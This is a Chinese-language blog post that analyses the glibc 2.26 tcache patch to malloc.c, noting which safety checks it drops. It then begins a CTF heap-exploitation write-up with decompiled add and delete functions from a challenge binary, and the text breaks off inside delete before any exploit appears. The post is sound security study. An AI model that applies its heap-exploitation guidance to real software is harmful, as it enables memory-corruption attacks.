<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    
    
    <title>tcache.md | NightRainy&#39;s Blog | Stay hungry,stay foolish</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="">
    <link rel="shortcut icon" href="/img/favicon.jpg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.1">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"nightRainy","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/favicon.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">nightRainy</h5>
          <a href="mailto:jianaiyuheng@qq.com" title="jianaiyuheng@qq.com" class="mail">
            
              <span>j</span>
            
              <span>i</span>
            
              <span>a</span>
            
              <span>n</span>
            
              <span>a</span>
            
              <span>i</span>
            
              <span>y</span>
            
              <span>u</span>
            
              <span>h</span>
            
              <span>e</span>
            
              <span>n</span>
            
              <span>g</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/nightRainy" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/">
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/archives">
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/nightRainy" target="_blank">
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>tcache.md</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">tcache.md</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-07-11T14:03:19.000Z" itemprop="datePublished" class="page-time">
  2019-07-11
</time>


            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left">
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-tcache-md" class="post-article article-type-post" itemprop="blogPost">
      <div class="post-card">
          <h1 class="post-card-title">tcache.md</h1>
          <div class="post-meta">
              <time class="post-time" title="2019-07-11 22:03:19" datetime="2019-07-11T14:03:19.000Z" itemprop="datePublished">2019-07-11</time>

              


              

              


              
          </div>
          <div class="post-content" id="post-content" itemprop="postContent">
              
              <blockquote>
<p>tcache作为libc2.26新加的机制,优先级高于fastbin,在提升速度的同时及完美的诠释了要速度就牺牲安全性这一定则。可以在<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">这里</a>找到当时新更新的代码。</p>
</blockquote>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>tcache(thread local caching),作为一个优先级高于fastbin新的缓存cache，相比fastbin是提升了不少的性能，但与此同时，带来的副作用就是比fastbin更好利用。我们可以看看更新的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">* config.make.in: Enable experimental malloc option.</span><br><span class="line">* configure.ac: Likewise.</span><br><span class="line">* configure: Regenerate.</span><br><span class="line">* manual/install.texi: Document it.</span><br><span class="line">* INSTALL: Regenerate.</span><br><span class="line">* malloc/Makefile: Likewise.</span><br><span class="line">* malloc/malloc.c: Add per-thread cache (tcache).</span><br><span class="line">(tcache_put): New.</span><br><span class="line">(tcache_get): New.</span><br><span class="line">(tcache_thread_freeres): New.</span><br><span class="line">(tcache_init): New.</span><br><span class="line">(__libc_malloc): Use cached chunks if available.</span><br><span class="line">(__libc_free): Initialize tcache if needed.</span><br><span class="line">(__libc_realloc): Likewise.</span><br><span class="line">(__libc_calloc): Likewise.</span><br><span class="line">(_int_malloc): Prefill tcache when appropriate.</span><br><span class="line">(_int_free): Likewise.</span><br><span class="line">(do_set_tcache_max): New.</span><br><span class="line">(do_set_tcache_count): New.</span><br><span class="line">(do_set_tcache_unsorted_limit): New.</span><br><span class="line">* manual/probes.texi: Document new probes.</span><br><span class="line">* malloc/arena.c: Add new tcache tunables.</span><br><span class="line">* elf/dl-tunables.list: Likewise.</span><br><span class="line">* manual/tunables.texi: Document them.</span><br><span class="line">* NEWS: Mention the per-thread cache.</span><br></pre></td></tr></table></figure>
<p>这里我们直接看malloc.c所加的代码</p>
<h2 id="malloc-c"><a href="#malloc-c" class="headerlink" title="malloc.c"></a>malloc.c</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>先看下最前面所定义的东西:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1 +#if USE_TCACHE</span><br><span class="line">2 +/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="line">3 +# define TCACHE_MAX_BINS               64</span><br><span class="line">4 +# define MAX_TCACHE_SIZE       tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="line">5 +</span><br><span class="line">6 +/* Only used to pre-fill the tunables.  */</span><br><span class="line">7 +# define tidx2usize(idx)       (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="line">8 +</span><br><span class="line">9 +/* When &quot;x&quot; is from chunksize().  */</span><br><span class="line">10 +# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="line">11 +/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="line">12 +# define usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="line">13 +</span><br><span class="line">14 +/* With rounding and alignment, the bins are...</span><br><span class="line">15 +   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="line">16 +   idx 1   bytes 25..40 or 13..20</span><br><span class="line">17 +   idx 2   bytes 41..56 or 21..28</span><br><span class="line">18 +   etc.  */</span><br><span class="line">19 +</span><br><span class="line">20 +/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="line">21 +   tcache bin will hold at most this number of chunks.  */</span><br><span class="line">22 +# define TCACHE_FILL_COUNT 7</span><br><span class="line">23 +#endif</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
<ul>
<li>可以看到规定tcache最多由64个Bins链接而成(第三行),而每一个bins里最多存放7个chunk(第21行)</li>
<li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次.(15-17行)</li>
</ul>
<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>在tcache机制中新增了两个新的结构体:tcahce_entry和tcache_perthread_struct,两个结构体的定义如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="line">+   the chunk is stored in the per-thread cache.  */</span><br><span class="line">+typedef struct tcache_entry</span><br><span class="line">+&#123;</span><br><span class="line">+  struct tcache_entry *next;</span><br><span class="line">+&#125; tcache_entry;</span><br><span class="line">+</span><br><span class="line">+/* There is one of these for each thread, which contains the</span><br><span class="line">+   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="line">+   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="line">+   are redundant (we could have just counted the linked list each</span><br><span class="line">+   time), this is for performance reasons.  */</span><br><span class="line">+typedef struct tcache_perthread_struct</span><br><span class="line">+&#123;</span><br><span class="line">+  char counts[TCACHE_MAX_BINS];</span><br><span class="line">+  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">+&#125; tcache_perthread_struct;</span><br><span class="line">+</span><br><span class="line">+static __thread char tcache_shutting_down = 0;</span><br><span class="line">+static __thread tcache_perthread_struct *tcache = NULL;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>可以看到tcache_entry为单链表结构</li>
<li>而tcache_perthread_struct为tcahch机制的主体<ol>
<li>一个链表中内存块的最大数量为TCACHE_MAX_BINS即64;</li>
<li>不同大小的单链表(64)</li>
</ol>
</li>
</ul>
<h3 id="两个新定义的函数-tcache-get-和tcache-put"><a href="#两个新定义的函数-tcache-get-和tcache-put" class="headerlink" title="两个新定义的函数(tcache_get 和tcache_put)"></a>两个新定义的函数(tcache_get 和tcache_put)</h3><p>这两个函数被用于在链表中取出和插入chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+/* Caller must ensure that we know tc_idx is valid and there&apos;s room</span><br><span class="line">+   for more chunks.  */</span><br><span class="line">+static void</span><br><span class="line">+tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">+&#123;</span><br><span class="line">+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">+  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">+  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">+  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">+  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+/* Caller must ensure that we know tc_idx is valid and there&apos;s</span><br><span class="line">+   available chunks to remove.  */</span><br><span class="line">+static void *</span><br><span class="line">+tcache_get (size_t tc_idx)</span><br><span class="line">+&#123;</span><br><span class="line">+  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">+  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">+  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">+  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">+  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">+  return (void *) e;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
<p>可以看到开发者希望我们确信参数是合法的,但安全性而言,这完全是放开了检查机制,摒弃了安全性而只追求速度</p>
<h3 id="tcache-thread-freeres"><a href="#tcache-thread-freeres" class="headerlink" title="tcache_thread_freeres"></a>tcache_thread_freeres</h3><p>用于清空当前线程的tcache<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+</span><br><span class="line">+static void __attribute__ ((section (&quot;__libc_thread_freeres_fn&quot;)))</span><br><span class="line">+tcache_thread_freeres (void)</span><br><span class="line">+&#123;</span><br><span class="line">+  int i;</span><br><span class="line">+  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line">+</span><br><span class="line">+  if (!tcache)</span><br><span class="line">+    return;</span><br><span class="line">+</span><br><span class="line">+  tcache = NULL;</span><br><span class="line">+</span><br><span class="line">+  for (i = 0; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">+    &#123;</span><br><span class="line">+      while (tcache_tmp-&gt;entries[i])</span><br><span class="line">+       &#123;</span><br><span class="line">+         tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">+         tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">+         __libc_free (e);</span><br><span class="line">+       &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+  __libc_free (tcache_tmp);</span><br><span class="line">+</span><br><span class="line">+  tcache_shutting_down = 1;</span><br><span class="line">+&#125;</span><br><span class="line">+text_set_element (__libc_thread_subfreeres, tcache_thread_freeres);</span><br><span class="line">+</span><br></pre></td></tr></table></figure></p>
<h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init_"></a>tcache_init_</h3><p>初始化函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">+static void</span><br><span class="line">+tcache_init(void)</span><br><span class="line">+&#123;</span><br><span class="line">+  mstate ar_ptr;</span><br><span class="line">+  void *victim = 0;</span><br><span class="line">+  const size_t bytes = sizeof (tcache_perthread_struct);</span><br><span class="line">+</span><br><span class="line">+  if (tcache_shutting_down)</span><br><span class="line">+    return;</span><br><span class="line">+</span><br><span class="line">+  arena_get (ar_ptr, bytes);</span><br><span class="line">+  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">+  if (!victim &amp;&amp; ar_ptr != NULL)</span><br><span class="line">+    &#123;</span><br><span class="line">+      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">+      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+  if (ar_ptr != NULL)</span><br><span class="line">+    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">+</span><br><span class="line">+  /* In a low memory situation, we may not be able to allocate memory</span><br><span class="line">+     - in which case, we just keep trying later.  However, we</span><br><span class="line">+     typically do this very early, so either there is sufficient</span><br><span class="line">+     memory, or there isn&apos;t enough memory to do non-trivial</span><br><span class="line">+     allocations anyway.  */</span><br><span class="line">+  if (victim)</span><br><span class="line">+    &#123;</span><br><span class="line">+      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">+      memset (tcache, 0, sizeof (tcache_perthread_struct));</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到tcache的内存块是由_int_malloc_生成的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+#if USE_TCACHE</span><br><span class="line">+  /* int_free also calls request2size, be careful to not pad twice.  */</span><br><span class="line">+  size_t tbytes = request2size (bytes);</span><br><span class="line">+  size_t tc_idx = csize2tidx (tbytes);</span><br><span class="line">+</span><br><span class="line">+  MAYBE_INIT_TCACHE ();</span><br><span class="line">+</span><br><span class="line">+  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">+  if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">+      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">+      &amp;&amp; tcache</span><br><span class="line">+      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">+    &#123;</span><br><span class="line">+      return tcache_get (tc_idx);</span><br><span class="line">+    &#125;</span><br><span class="line">+  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line">+#endif</span><br></pre></td></tr></table></figure>
<p>这里主要检查了tcache和tcahce_list是否为空和参数是否越界的问题<br>如果没有问题就调用tcache_get函数</p>
<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><p>而_int_malloc函数中是这么写的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+#if USE_TCACHE</span><br><span class="line">+         /* While we&apos;re here, if we see other chunks of the same size,</span><br><span class="line">+            stash them in the tcache.  */</span><br><span class="line">+         size_t tc_idx = csize2tidx (nb);</span><br><span class="line">+         if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">+           &#123;</span><br><span class="line">+             mchunkptr tc_victim;</span><br><span class="line">+</span><br><span class="line">+             /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">+             while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">+                    &amp;&amp; (pp = *fb) != NULL)</span><br><span class="line">+               &#123;</span><br><span class="line">+                 REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">+                 if (tc_victim != 0)</span><br><span class="line">+                   &#123;</span><br><span class="line">+                     tcache_put (tc_victim, tc_idx);</span><br><span class="line">+                   &#125;</span><br><span class="line">+               &#125;</span><br><span class="line">+           &#125;</span><br><span class="line">+#endif</span><br></pre></td></tr></table></figure></p>
<h3 id="init-free"><a href="#init-free" class="headerlink" title="_init_free"></a>_init_free</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+#if USE_TCACHE</span><br><span class="line">+  &#123;</span><br><span class="line">+    size_t tc_idx = csize2tidx (size);</span><br><span class="line">+</span><br><span class="line">+    if (tcache</span><br><span class="line">+       &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">+       &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">+      &#123;</span><br><span class="line">+       tcache_put (p, tc_idx);</span><br><span class="line">+       return;</span><br><span class="line">+      &#125;</span><br><span class="line">+  &#125;</span><br><span class="line">+#endif</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
<p>先判断参数合法，相同大小chunk的数量在7个以内时，就进入 tcache_put()进行释放</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>tcache的优先级是最高的,在满足tcache所需size的chunk中,free后一定是先进入tcache的</li>
<li>由于删减了一些检查机制,从而使得安全性急剧下降</li>
</ul>
<h1 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h1><blockquote>
<p>这里引用ex师傅的一道题,顺便安利一下<a href="http://blog.eonew.cn/" target="_blank" rel="noopener">EX师傅的博客</a></p>
</blockquote>
<h2 id="mian函数"><a href="#mian函数" class="headerlink" title="mian函数"></a>mian函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v5; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  puts(&quot;Welcome!&quot;);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    puts(menu);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">    switch ( (unsigned int)off_400E38 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 2u:</span><br><span class="line">        delete();</span><br><span class="line">        break;</span><br><span class="line">      case 3u:</span><br><span class="line">        edit();</span><br><span class="line">        break;</span><br><span class="line">      case 4u:</span><br><span class="line">        show();</span><br><span class="line">        break;</span><br><span class="line">      case 5u:</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;Invalid option!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 != 5 );</span><br><span class="line">  puts(&quot;Bye!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这是一道常见的菜单题目，一共有四个功能，分别是添加，删除，修改，打印，然后跟进四个函数</p>
<h2 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  unsigned int i; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned int v3; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  v3 = -1;</span><br><span class="line">  for ( i = 0; i &lt;= 0xF; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = i;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v3 == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Error: Don&apos;t have enough space!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;What size do you want?&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">    ptr[v3] = malloc(v1);</span><br><span class="line">    printf(&quot;Success! The index is %d .\n&quot;, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从add函数中可以看出，我们可以自己控制chunk的大小，与此同时还限定了最多分配１６个chunk</p>
<h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Which one do you want to delete?&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( (v1 &amp; 0x80000000) == 0 &amp;&amp; v1 &lt;= 0xF &amp;&amp; ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free((void *)ptr[v1]);</span><br><span class="line">    puts(&quot;Success!&quot;);</span><br><span class="line">  &#125;</span><br><span 